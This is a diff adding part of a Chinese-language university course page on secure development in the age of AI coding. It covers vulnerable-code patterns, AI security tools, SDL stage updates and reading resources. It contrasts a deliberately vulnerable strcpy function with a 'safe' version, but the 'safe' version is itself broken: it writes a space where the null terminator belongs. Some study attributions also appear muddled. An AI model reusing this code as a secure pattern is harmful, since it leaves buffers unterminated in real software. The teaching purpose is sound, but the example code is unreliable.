+      <span class="card-icon">☠️</span>
+      <h4>训练数据含漏洞代码</h4>
+      <p>模型在 GitHub 上数十亿行代码上训练，其中包含大量已知漏洞。它会<strong>自信地复现</strong>这些漏洞模式——尤其是历史上高频出现的 CWE（如 CWE-89 SQL注入、CWE-79 XSS）。</p>
+      <p style="margin-top:8px;font-size:12px;color:var(--muted)">📄 Pearce et al.「Asleep at the Keyboard?」IEEE S&P 2022</p>
+    </div>
+    <div class="card accent-yellow">
+      <span class="card-icon">🌀</span>
+      <h4>上下文截断导致验证缺失</h4>
+      <p>AI 只看到函数级别的上下文，不了解调用者的信任假设。结果是：生成的函数内部逻辑正确，但<strong>缺少调用者期望的边界检查</strong>——整个系统级别的输入验证链断裂。</p>
+      <p style="margin-top:8px;font-size:12px;color:var(--muted)">典型场景：内部函数被 AI 写成"相信输入已验证"，但上层调用者从未验证。</p>
+    </div>
+    <div class="card accent-purple">
+      <span class="card-icon">🔑</span>
+      <h4>密钥与凭证泄露加速</h4>
+      <p>开发者将含 API Key 的代码上下文粘贴给 AI 助手，或 AI 生成的示例代码中硬编码了占位密钥，被误提交到仓库。GitGuardian 2023 报告：此类泄露同比增长 <strong>67%</strong>。</p>
+      <p style="margin-top:8px;font-size:12px;color:var(--muted)">工具对策：git-secrets、truffleHog、GitHub Secret Scanning。</p>
+    </div>
+  </div>
+
+  <h3 class="sub-title">真实案例：Copilot 复现 CWE-787 越界写入</h3>
+  <p>斯坦福 2021 年实验：给 Copilot 一个模糊的函数描述（"将用户输入写入缓冲区"），在 89 个生成样本中，约 <strong>40%</strong> 含有至少一个 CWE 级别的安全问题，CWE-787（越界写入）和 CWE-89（SQL 注入）出现频率最高。</p>
+
+  <div class="compare-grid">
+    <div class="card compare-bad">
+      <div class="compare-label">❌ Copilot 生成（含漏洞）</div>
+      <pre style="font-size:12px;padding:0;background:none;color:#f09090;overflow-x:auto">void store_input(char *buf, char *input) {
+    // Copilot 生成：直接 strcpy，无长度检查
+    strcpy(buf, input);
+}</pre>
+    </div>
+    <div class="card compare-good">
+      <div class="compare-label">✅ 安全写法</div>
+      <pre style="font-size:12px;padding:0;background:none;color:#82d99a;overflow-x:auto">void store_input(char *buf, size_t buf_sz,
+                 const char *input) {
+    // 显式长度限制 + 截断保护
+    strncpy(buf, input, buf_sz - 1);
+    buf[buf_sz - 1] = ' ';
+}</pre>
+    </div>
+  </div>
+
+  <div class="callout ai">
+    <span class="callout-icon">🧠</span>
+    <div class="callout-body"><strong>Vibe Coding 现象：</strong>2024 年 Andrej Karpathy 提出"Vibe Coding"——开发者完全依赖 AI 生成代码，自己不读、不理解、直接运行。对功能开发是效率飞跃，对安全是系统性风险：<strong>没有人理解代码的行为，也就没有人在做威胁建模</strong>。SDL 的"培训"阶段（阶段1）在此背景下需要重新设计——不再只是教"怎么写安全代码"，而是教"怎么审查 AI 生成的代码"。</div>
+  </div>
+</section>
+
+<section id="ai-tools">
+  <h2 class="section-title"><span class="num">§6.2</span>AI 驱动的安全工具链</h2>
+  <div class="section-divider"></div>
+
+  <p>AI 不只是制造新问题——它也在改变安全工具本身的形态。以下是 2023–2024 年已落地或进入实验阶段的工具方向：</p>
+
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>工具方向</th><th>代表工具 / 研究</th><th>做什么</th><th>成熟度</th></tr></thead>
+      <tbody>
+        <tr>
+          <td>AI 增强 SAST</td>
+          <td>CodeQL + LLM、GitHub Advanced Security</td>
+          <td>不止报警，还能<strong>解释漏洞成因</strong>并生成修复代码建议（PR 级别的 fix）</td>
+          <td><span class="badge badge-green">已上线</span></td>
+        </tr>
+        <tr>
+          <td>LLM-assisted Fuzzing</td>
+          <td>OSS-Fuzz + LLM（Google, 2024）、Fuzz4All（ICSE 2024）</td>
+          <td>自动生成 harness + 结构感知种子，curl/OpenSSL 覆盖率提升 ~30%</td>
+          <td><span class="badge badge-blue">研究阶段</span></td>
+        </tr>
+        <tr>
+          <td>AI 威胁建模</td>
+          <td>Microsoft Copilot for Security、StrideGPT</td>
+          <td>输入系统架构图，半自动输出 STRIDE 分析报告和 DFD</td>
+          <td><span class="badge badge-yellow">预览/Beta</span></td>
+        </tr>
+        <tr>
+          <td>AI 辅助渗透</td>
+          <td>PentestGPT（USENIX Sec 2024）</td>
+          <td>LLM 驱动渗透策略决策；情报收集和漏洞分析阶段效果最好</td>
+          <td><span class="badge badge-blue">研究阶段</span></td>
+        </tr>
+        <tr>
+          <td>漏洞修复自动化</td>
+          <td>VulRepair、AlphaCode + 安全约束</td>
+          <td>给定漏洞代码片段，自动生成安全补丁；CWE-119 类漏洞修复准确率约 50%</td>
+          <td><span class="badge badge-blue">研究阶段</span></td>
+        </tr>
+        <tr>
+          <td>供应链 AI 审计</td>
+          <td>SBOM + LLM 分析</td>
+          <td>扫描依赖树中的已知 CVE，并评估 AI 模型本身（权重文件）的来源可信度</td>
+          <td><span class="badge badge-yellow">新兴</span></td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<section id="ai-sdl">
+  <h2 class="section-title"><span class="num">§6.3</span>SDL 如何应对 AI Coding</h2>
+  <div class="section-divider"></div>
+
+  <p>SDL 的7个阶段框架不会作废，但每个阶段的<strong>关键动作需要更新</strong>。以下是针对 AI Coding 场景的差异化要求：</p>
+
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>SDL 阶段</th><th>传统做法</th><th>AI Coding 时代新增要求</th></tr></thead>
+      <tbody>
+        <tr>
+          <td><strong>培训</strong></td>
+          <td>教开发者写安全代码</td>
+          <td>增加「如何审查 AI 生成代码」专项培训；识别 AI 的典型漏洞模式</td>
+        </tr>
+        <tr>
+          <td><strong>需求</strong></td>
+          <td>定义安全需求</td>
+          <td>明确哪些模块<strong>禁止</strong>使用 AI 辅助（如加密实现、认证逻辑）</td>
+        </tr>
+        <tr>
+          <td><strong>设计</strong></td>
+          <td>威胁建模</td>
+          <td>将「AI 代码引入」纳入攻击面：模型供应链、训练数据投毒均需建模</td>
+        </tr>
+        <tr>
+          <td><strong>实现</strong></td>
+          <td>代码审查 + SAST</td>
+          <td>AI 生成代码<strong>必须经过人工安全审查</strong>，不能直接合并；部署 secret scanning 防止密钥提交</td>
+        </tr>
+        <tr>
+          <td><strong>验证</strong></td>
+          <td>安全测试</td>
+          <td>对 AI 生成模块加强 fuzz 测试；用 LLM 辅助生成更多边界测试用例</td>
+        </tr>
+        <tr>
+          <td><strong>发布</strong></td>
+          <td>最终安全审查</td>
+          <td>SBOM 中需要标注哪些代码由 AI 生成；AI 辅助工具本身的版本也要记录</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="callout danger">
+    <span class="callout-icon">🚨</span>
+    <div class="callout-body"><strong>最小特权原则 vs AI 代码助手：</strong>IDE 插件（Copilot、Cursor）通常拥有读取整个工作区文件的权限，包括 <code style="font-family:monospace;background:rgba(255,255,255,.08);padding:1px 4px;border-radius:2px">.env</code>、<code style="font-family:monospace;background:rgba(255,255,255,.08);padding:1px 4px;border-radius:2px">config/secrets.yaml</code> 等敏感文件。将这些内容发送到云端进行补全时，违反了最小特权和数据保护原则。企业部署时应配置 <strong>workspace exclusion</strong> 或选择本地推理模型（如 CodeLlama）。</div>
+  </div>
+</section>
+
+<!-- §7 Resources -->
+<section id="resources">
+  <h2 class="section-title"><span class="num">📚</span>延伸阅读与工具资源</h2>
+  <div class="section-divider"></div>
+  <p>按主题分类，优先选择有代码/实操内容的资源，标注了难度和适用场景。</p>
+
+  <h3 class="sub-title">📖 必读文献与标准</h3>
+  <div class="resource-grid">
+    <a class="resource-card" href="https://www.microsoft.com/en-us/securityengineering/sdl" target="_blank">
+      <span class="rc-icon">🏢</span>
+      <div class="rc-body">
+        <div class="rc-title">Microsoft SDL 官方文档</div>
+        <div class="rc-desc">SDL 7阶段的权威说明，包含各阶段的工具推荐和检查清单。</div>
+        <span class="rc-tag">SDL · 免费</span>
+      </div>
+    </a>
+    <a class="resource-card" href="https://owasp.org/www-project-samm/" target="_blank">
+      <span class="rc-icon">🌐</span>
+      <div class="rc-body">
+        <div class="rc-title">OWASP SAMM</div>
+        <div class="rc-desc">软件保证成熟度模型，可在线评估你的团队安全成熟度，有中文翻译版。</div>
+        <span class="rc-tag">成熟度模型 · 免费</span>
+      </div>
+    </a>
+    <a class="resource-card" href="https://cheatsheetseries.owasp.org/" target="_blank">
+      <span class="rc-icon">📋</span>
+      <div class="rc-body">
+        <div class="rc-title">OWASP Cheat Sheet Series</div>
+        <div class="rc-desc">输入验证、SQL注入防御、密码存储等80+个主题的实战速查表，代码示例齐全。</div>
+        <span class="rc-tag">实战参考 · 免费</span>
+      </div>
+    </a>
+    <a class="resource-card" href="https://nvd.nist.gov/vuln/search" target="_blank">
+      <span class="rc-icon">🔍</span>
+      <div class="rc-body">
+        <div class="rc-title">NVD / CVE 数据库</div>
+        <div class="rc-desc">查找任意软件的历史 CVE，理解真实漏洞的成因、CVSS 评分和修复方式。写论文的漏洞数据来源。</div>
+        <span class="rc-tag">漏洞数据库 · 免费</span>
+      </div>
+    </a>
+  </div>
+
+  <h3 class="sub-title">🛠️ 实操工具（可直接上手）</h3>
+  <div class="resource-grid">
+    <a class="resource-card" href="https://portswigger.net/web-security" target="_blank">
+      <span class="rc-icon">🎯</span>
+      <div class="rc-body">
+        <div class="rc-title">PortSwigger Web Security Academy</div>
+        <div class="rc-desc">Burp Suite 官方出品，免费，覆盖 SQL 注入/XSS/SSRF/JWT 等核心漏洞，每个章节有靶场实验。找安全工作之前的必刷内容。</div>
+        <span class="rc-tag">Web安全 · 免费靶场</span>
+      </div>
+    </a>
+    <a class="resource-card" href="https://www.hackthebox.com/" target="_blank">
+      <span class="rc-icon">💻</span>
+      <div class="rc-body">
+        <div class="rc-title">HackTheBox</div>
+        <div class="rc-desc">渗透测试实战平台，退役机器免费，对应 PTES 各阶段。OSCP 考试的主要练习来源。</div>
+        <span class="rc-tag">渗透测试 · 部分免费</span>
+      </div>
+    </a>
+    <a class="resource-card" href="https://github.com/google/oss-fuzz" target="_blank">
+      <span class="rc-icon">🧬</span>
+      <div class="rc-body">
+        <div class="rc-title">Google OSS-Fuzz</div>
+        <div class="rc-desc">开源项目持续模糊测试平台，可以直接看到真实漏洞的 fuzz 案例和 harness 写法。科研入门必看。</div>
+        <span class="rc-tag">Fuzzing · 开源</span>
+      </div>
+    </a>
+    <a class="resource-card" href="https://github.com/microsoft/threatdragon" target="_blank">
+      <span class="rc-icon">🗺️</span>
+      <div class="rc-body">
+        <div class="rc-title">OWASP Threat Dragon</div>
+        <div class="rc-desc">开源威胁建模工具，可画 DFD 图并自动生成 STRIDE 威胁列表，有桌面版和 Web 版。</div>
+        <span class="rc-tag">威胁建模 · 开源</span>
+      </div>
+    </a>
+  </div>
+
+  <h3 class="sub-title">🤖 AI 安全专项资源</h3>
+  <div class="resource-grid">
+    <a class="resource-card" href="https://arxiv.org/abs/2108.09293" target="_blank">
+      <span class="rc-icon">📄</span>
+      <div class="rc-body">
+        <div class="rc-title">Asleep at the Keyboard? (Pearce et al., 2022)</div>
+        <div class="rc-desc">评估 Copilot 生成代码安全性的原始论文，IEEE S&P 2022，是讨论 AI 代码安全的必引文献。</div>
+        <span class="rc-tag">论文 · arXiv 免费</span>
+      </div>
+    </a>
+    <a class="resource-card" href="https://github.com/GreyDGL/PentestGPT" target="_blank">
+      <span class="rc-icon">⚔️</span>
+      <div class="rc-body">
+        <div class="rc-title">PentestGPT（开源）</div>
+        <div class="rc-desc">USENIX Security 2024 论文配套代码，LLM 驱动的渗透测试框架，可本地部署研究。</div>
+        <span class="rc-tag">AI 渗透 · 开源</span>
+      </div>
+    </a>
+    <a class="resource-card" href="https://owasp.org/www-project-top-10-for-large-language-model-applications/" target="_blank">
+      <span class="rc-icon">🌐</span>
+      <div class="rc-body">
+        <div class="rc-title">OWASP LLM Top 10</div>
+        <div class="rc-desc">针对 LLM 应用的十大安全风险，涵盖提示注入、训练数据泄露、模型拒绝服务等，2024 年版已发布。</div>
+        <span class="rc-tag">LLM 安全 · 免费</span>
+      </div>
+    </a>
+    <a class="resource-card" href="https://github.com/gitleaks/gitleaks" target="_blank">
+      <span class="rc-icon">🔑</span>
+      <div class="rc-body">
+        <div class="rc-title">Gitleaks</div>
+        <div class="rc-desc">扫描 Git 仓库中的 API Key / 密码 / 证书等敏感信息泄露，可集成进 pre-commit hook 和 CI/CD 流水线。</div>
+        <span class="rc-tag">密钥扫描 · 开源</span>
+      </div>
+    </a>
+  </div>
+</section>
+
+</div><!-- .content -->
+</div><!-- #main -->
+
+<footer>
+  <span>第6章 · 安全开发生命周期 · 网络空间安全学院</span>
+  <span>SDL / DevSecOps / STRIDE / SQUARE / Fuzzing / PTES / AI Coding Security</span>
+</footer>
+
+<script>
+// Scroll spy
+const sections = document.querySelectorAll('section[id]');
+const links = document.querySelectorAll('.nav-link');
+
+const observer = new IntersectionObserver(entries => {
+  entries.forEach(e => {
+    if (e.isIntersecting) {
+      links.forEach(l => l.classList.remove('active'));
+      const active = document.querySelector(`.nav-link[href="#${e.target.id}"]`);
+      if (active) active.classList.add('active');
+    }
+  });
+}, { rootMargin: '-20% 0px -70% 0px' });
+
+sections.forEach(s => observer.observe(s));
+</script>
+</body>
+</html>
